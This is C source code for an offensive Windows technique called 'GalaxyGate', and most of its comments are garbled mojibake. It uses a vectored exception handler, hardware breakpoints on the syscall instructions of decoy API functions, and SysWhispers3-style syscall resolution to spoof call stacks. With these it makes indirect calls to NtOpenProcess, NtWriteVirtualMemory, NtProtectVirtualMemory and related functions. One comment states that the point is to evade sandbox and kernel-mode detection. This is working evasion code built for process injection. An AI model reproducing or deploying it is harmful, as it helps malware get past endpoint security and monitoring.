#include <stdio.h>
#include <stdint.h>
#include "syscalls.h"
#include <stdbool.h>
#include <wchar.h>
#include <wctype.h>
#include "VEHinj.h"

// SysWhisper3 SSN-Resolve
PVOID SW3_GetSyscallAddress(DWORD FunctionHash);
DWORD SW3_GetSyscallNumber(DWORD FunctionHash);

typedef struct _SFParams {
	DWORD ParamNum; // ��ʵ���õĺ�����������
	DWORD FuncHash; // ��ʵ���õĺ�����ϣֵ
	DWORD DummyHash; // ���ܺ�����ϣֵ
	DWORD_PTR param[17]; // Nt*���������18������
} SFParams, * PSFParams;

DWORD* NullPointer = NULL;
SFParams Params = { 0 }; // ������VEH������ʵ�ĺ������ò���

/*========================================
  GalaxyGate ����ջ��ƭ���ϵͳ���÷��� :3
  Author: ��ҶƬItsSunshineXD
========================================*/

/*
 ��GetFileAttributesWΪ���ܺ���Ϊ��
 Step.1 �������ʳ�ͻ�쳣 ͨ��VEH��NtQueryAttributesFile��syscallָ���봦����Ӳ���ϵ�
 Step.2 ����GetFileAttributesW���� ��ӵ���NtQueryAttributesFile�����ϵ�
 Step.3 VEH����ִ���� ������Ȼ�ĵ��ö�ջ ����ϵͳ���úź͵��ò��� ʵ��ջ��ƭ
*/

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
	if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(Params.DummyHash); // �ڿ��ܺ�����syscallָ�����Ӳ���ϵ�
		pExceptInfo->ContextRecord->Dr7 = 0x00000303; // ����Dr0�ϵ�
		pExceptInfo->ContextRecord->Rip = pExceptInfo->ContextRecord->Rip + 6; // ���������쳣�õ�*NullPointer = 1ָ��
		// ��MSVC������������*NullPointer = 1ָ��Ļ����볤��Ϊ6Byte ��ʹ������������ ������Ҫ�޸ĸ�ֵ
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	else if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
		pExceptInfo->ContextRecord->Rcx = Params.param[1]; // ����_Fastcall����Լ�� ������ʵ���ò���
		pExceptInfo->ContextRecord->Rdx = Params.param[2];
		pExceptInfo->ContextRecord->R8 = Params.param[3];
		pExceptInfo->ContextRecord->R9 = Params.param[4];
		pExceptInfo->ContextRecord->R10 = Params.param[1];
		if (Params.ParamNum > 4) {
			int extra_para = Params.ParamNum - 4;
			DWORD64* stack = (DWORD64*)(pExceptInfo->ContextRecord->Rsp + 40); // ƫ��40�ֽ� ����Ӱ�ӿռ�
			for (int i = 5; i <= Params.ParamNum; ++i) {
				stack[i - 5] = (DWORD64)(Params.param[i]); // ͨ����ջ����ʣ�����
			}
		}
		pExceptInfo->ContextRecord->Rax = SW3_GetSyscallNumber(Params.FuncHash); // ϵͳ���úŻ�Ϊ��ʵ���ú���
		pExceptInfo->ContextRecord->Rip = SW3_GetSyscallAddress(Params.FuncHash); // Ripָ����ʵ���õĺ���syscallָ����
		// ��һ����Ϊ�˶Կ������ɳ�� ɾ�����лᱻ�ж�Ϊֱ��ϵͳ����
		pExceptInfo->ContextRecord->Dr0 = 0;
		pExceptInfo->ContextRecord->Dr7 = 0; // ������ԼĴ��� ��ֹ�ں�̬��Ӳ���ϵ�ļ��
		memset(&Params, 0, sizeof(Params));
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}



NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)BaseAddress;
	Params.param[3] = (DWORD_PTR)RegionSize;
	Params.param[4] = (DWORD_PTR)NewProtect;
	Params.param[5] = (DWORD_PTR)OldProtect;
	Params.ParamNum = 5;
	Params.FuncHash = 0x097129F93;
	// DummyFunc1
	Params.DummyHash = 0x09E349EA7;
	*NullPointer = 1;
	ULONGLONG buf = 0;
	GetNumaAvailableMemoryNode(0, &buf);
	// DummyFunc1
	return 0;
}

NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)BaseAddress;
	Params.param[3] = (DWORD_PTR)Buffer;
	Params.param[4] = (DWORD_PTR)NumberOfBytesToWrite;
	Params.param[5] = (DWORD_PTR)NumberOfBytesWritten;
	Params.ParamNum = 5;
	Params.FuncHash = 0x007901F0F;
	// DummyFunc2
	Params.DummyHash = 0x022B80BFE;
	*NullPointer = 1;
	GetFileAttributesW(L"D:\\logs\\sf.log");
	// DummyFunc2
	return 0;
}

NTSTATUS SFNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)BaseAddress;
	Params.param[3] = (DWORD_PTR)Buffer;
	Params.param[4] = (DWORD_PTR)BufferSize;
	Params.param[5] = (DWORD_PTR)NumberOfBytesRead;
	Params.ParamNum = 5;
	Params.FuncHash = 0x01D950B1B;
	// DummyFunc3
	Params.DummyHash = 0x09E349EA7;
	*NullPointer = 1;
	ULONGLONG buf = 0;
	GetNumaNodeProcessorMask(0, &buf);
	// DummyFunc3
	return 0;
}

NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)DesiredAccess;
	Params.param[3] = (DWORD_PTR)ObjectAttributes;
	Params.param[4] = (DWORD_PTR)ClientId;
	Params.ParamNum = 4;
	Params.FuncHash = 0x0FEA4D138;
	// DummyFunc4
	Params.DummyHash = 0x0A6208368;
	*NullPointer = 1;
	DWORD buf[4] = { 0 };
	GetVolumeInformationW(L"C:\\", &buf[0], sizeof(DWORD), &buf[1], &buf[2], &buf[3], &buf[4], sizeof(DWORD));
	// DummyFunc4
	return 0;
}

NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)ProcessInformationClass;
	Params.param[3] = (DWORD_PTR)ProcessInformation;
	Params.param[4] = (DWORD_PTR)ProcessInformationLength;
	Params.param[5] = (DWORD_PTR)ReturnLength;
	Params.ParamNum = 5;
	Params.FuncHash = 0x0DD27CE88;
	// DummyFunc5
	Params.DummyHash = 0x022B80BFE;
	*NullPointer = 1;
	GetFileAttributesW(L"D:\\logs\\sf.log");
	// DummyFunc5
	return 0;
}

NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options) {
	Params.param[1] = (DWORD_PTR)SourceProcessHandle;
	Params.param[2] = (DWORD_PTR)SourceHandle;
	Params.param[3] = (DWORD_PTR)TargetProcessHandle;
	Params.param[4] = (DWORD_PTR)TargetHandle;
	Params.param[5] = (DWORD_PTR)DesiredAccess;
	Params.param[6] = (DWORD_PTR)HandleAttributes;
	Params.param[7] = (DWORD_PTR)Options;
	Params.ParamNum = 7;
	Params.FuncHash = 0x0ECBFE423;
	// DummyFunc6
	Params.DummyHash = 0x09E349EA7;
	*NullPointer = 1;
	ULONGLONG buf = 0;
	GetNumaNodeProcessorMask(0, &buf);
	// DummyFunc6
	return 0;
}

NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
	Params.param[1] = (DWORD_PTR)SystemInformationClass;
	Params.param[2] = (DWORD_PTR)SystemInformation;
	Params.param[3] = (DWORD_PTR)SystemInformationLength;
	Params.param[4] = (DWORD_PTR)ReturnLength;
	Params.ParamNum = 4;
	Params.FuncHash = 0x09E349EA7;
	// DummyFunc7
	Params.DummyHash = 0x022B80BFE;
	*NullPointer = 1;
	GetFileAttributesW(L"D:\\logs\\sf.log");
	// DummyFunc7
	return 0;
}

NTSTATUS SFNtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) {
	Params.param[1] = (DWORD_PTR)ProcessHandle;
	Params.param[2] = (DWORD_PTR)BaseAddress;
	Params.param[3] = (DWORD_PTR)MemoryInformationClass;
	Params.param[4] = (DWORD_PTR)MemoryInformation;
	Params.param[5] = (DWORD_PTR)MemoryInformationLength;
	Params.param[6] = (DWORD_PTR)ReturnLength;
	Params.ParamNum = 6;
	Params.FuncHash = 0x003910903;
	// DummyFunc8
	Params.DummyHash = 0x0A6208368;
	*NullPointer = 1;
	DWORD buf[4] = { 0 };
	GetVolumeInformationW(L"C:\\", &buf[0], sizeof(DWORD), &buf[1], &buf[2], &buf[3], &buf[4], sizeof(DWORD));
	// DummyFunc8
	return 0;
}
